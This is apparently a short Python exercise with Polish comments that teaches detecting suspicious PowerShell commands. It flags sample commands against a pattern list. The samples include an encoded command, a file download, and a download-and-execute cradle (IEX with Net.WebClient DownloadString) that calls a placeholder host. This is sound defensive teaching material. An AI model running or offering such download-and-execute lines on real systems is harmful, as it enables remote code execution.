# Ćwiczenie 14. Podejrzane polecenia PowerShell

commands = [
    "Get-Process",
    "Get-Service",
    "powershell.exe -EncodedCommand SQBFAFgA",
    "Get-ChildItem C:\\",
    "Invoke-WebRequest http://example.test/file.exe",
    (
        "IEX(New-Object Net.WebClient)"
        ".DownloadString('http://example.test/a.ps1')"
    ),
]


suspicious_patterns = [
    "encodedcommand",
    "invoke-webrequest",
    "downloadstring",
    "net.webclient",
    "iex(",
]


for command in commands:

    lower_command = command.lower()

    matches = []

    for pattern in suspicious_patterns:

        if pattern in lower_command:
            matches.append(pattern)

    if matches:

        print("\nALERT")

        print(
            f"Polecenie: {command}"
        )

        print(
            f"Wzorce: {matches}"
        )

    else:

        print(
            f"\nOK: {command}"
        )

# Zadanie: dodaj własny wzorzec, np. bypass.

